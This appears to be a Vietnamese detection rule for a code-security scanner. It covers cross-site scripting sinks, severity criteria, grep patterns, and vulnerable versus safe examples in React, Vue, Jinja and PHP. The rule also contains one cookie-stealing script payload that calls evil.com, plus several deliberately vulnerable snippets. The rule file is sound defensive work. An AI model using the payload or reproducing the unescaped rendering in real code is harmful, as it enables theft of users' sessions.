---
id: XSS
severity_max: HIGH
applies_to: all
---

# Cross-Site Scripting (XSS)

## Intent

User input (L1) được render thẳng vào HTML/DOM mà không escape. Attacker chèn `<script>fetch('//evil.com/?c='+document.cookie)</script>` để **đánh cắp session cookie, JWT từ localStorage, phishing form login, key-logging, hoặc xài CSRF từ trong tab nạn nhân**.

Vibe code rất hay dính vì AI sinh code "render markdown / preview HTML" hoặc dùng `dangerouslySetInnerHTML` / `v-html` / `innerHTML` cho tiện.

## Khi nào HIGH

- L1 input render vào HTML response qua `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `{{{ }}}` (Handlebars triple), `|safe` (Jinja), `Html.Raw` (.NET), `raw` (Rails)
- Không có sanitizer (DOMPurify, bleach, sanitize-html) ở giữa
- Stored XSS (lưu vào DB rồi render cho user khác) → impact cao hơn reflected XSS

## Khi nào MEDIUM (giảm cấp)

- Reflected XSS chỉ ảnh hưởng nạn nhân click link (cần social engineering)
- Có CSP nghiêm ngặt (`default-src 'self'; script-src 'self'`) chặn được inline script
- App chạy hoàn toàn trong webview nội bộ, không public

## Cách reasoning (KHÔNG pattern-match thuần)

1. **Grep** các sink nguy hiểm (xem patterns)
2. **Read** function chứa sink: data render ra đến từ đâu?
3. **Trace** L1-L4:
   - Đến từ `req.body`, `req.query`, form input, URL hash → L1
   - Đến từ DB nhưng do user khác nhập vào (`comment.body`, `post.content`) → L1 stored
   - Đến từ admin config hardcoded → L3, safe
4. **Verify**: có gọi `DOMPurify.sanitize()`, `bleach.clean()`, `escape()`, `sanitize-html` không?
5. Chú ý framework auto-escape: React `{var}` an toàn, JSX attribute an toàn; nhưng `dangerouslySetInnerHTML`, `href={userUrl}` (javascript: scheme), `dangerouslySetInnerHTML` thì không.

## Search patterns (gợi ý — KHÔNG chạy literal, dùng Grep tool)

### React / Vue / Angular

```
dangerouslySetInnerHTML\s*=\s*\{\{
v-html\s*=
\[innerHTML\]\s*=                          # Angular
bypassSecurityTrust(Html|Script|Url)
```

### Vanilla JS / DOM

```
\.innerHTML\s*=\s*[^"']                    # innerHTML = variable
\.outerHTML\s*=
document\.write\s*\(
\.insertAdjacentHTML\s*\(
eval\s*\(\s*.*req\.
```

### Server templating

```
\{\{\{\s*[a-zA-Z_]+\s*\}\}\}              # Handlebars/Mustache triple
\|\s*safe\b                                # Jinja2
\|\s*raw\b                                 # Twig / Jinja
Html\.Raw\s*\(                             # ASP.NET MVC
<%==\s*[^=]                                # ERB raw / EJS raw
```

### URL/attribute injection

```
href\s*=\s*\{?[a-zA-Z_]+\}?                # check javascript: scheme allowed
window\.location\s*=\s*req\.
```

## Examples

### HIGH — flag

```jsx
// React — comment.body là L1 stored (user khác nhập)
function CommentView({ comment }) {
  return <div dangerouslySetInnerHTML={{ __html: comment.body }} />;
}
```

```javascript
// Vanilla — q là L1 reflected
const q = new URLSearchParams(location.search).get("q");
document.getElementById("result").innerHTML = "Bạn tìm: " + q;
```

```python
# Jinja2 — user_bio là L1 stored
# template:
# <p>{{ user_bio | safe }}</p>
```

```php
<?php
// Reflected XSS
echo "<h1>Xin chào " . $_GET['name'] . "</h1>";
```

```html
<!-- Vue — message là L1 -->
<div v-html="message"></div>
```

### NOT high — không flag (hoặc downgrade)

```jsx
// React auto-escape — an toàn
<div>{comment.body}</div>
```

```javascript
// Dùng sanitizer
import DOMPurify from "dompurify";
el.innerHTML = DOMPurify.sanitize(userHtml);
```

```python
# Jinja2 default auto-escape ON
# <p>{{ user_bio }}</p>  → < và > được escape
```

```javascript
// textContent thay vì innerHTML — an toàn
el.textContent = userInput;
```

## Fix recommendation

1. **Default: escape, không raw**:
   - React: dùng `{var}`, tránh `dangerouslySetInnerHTML`
   - Vue: dùng `{{ var }}`, tránh `v-html`
   - Jinja2/Django: KHÔNG dùng `|safe` cho L1
2. **Cần render HTML (markdown, rich text)**: dùng sanitizer whitelist:
   ```javascript
   import DOMPurify from "dompurify";
   const clean = DOMPurify.sanitize(dirty, { ALLOWED_TAGS: ["b", "i", "a", "p"] });
   ```
   Python: `bleach.clean(text, tags=["b","i","a"])`.
3. **URL attributes**: validate scheme — chỉ cho `http:`, `https:`, `mailto:`:
   ```javascript
   const safe = /^(https?:|mailto:)/.test(url) ? url : "#";
   ```
4. **Set CSP header**:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
   ```
5. **HttpOnly cookie** cho session — XSS không đọc được cookie. Cộng SameSite=Lax. Tránh để JWT trong `localStorage` nếu lo XSS.

## Cross-references

- Rule `11-csrf`: XSS có thể bypass CSRF token (đọc DOM lấy token)
- Rule `17-verbose-error-debug-mode`: error page render lại input không escape → reflected XSS
- Rule `19-no-csp-headers`: thiếu CSP làm XSS dễ exploit hơn
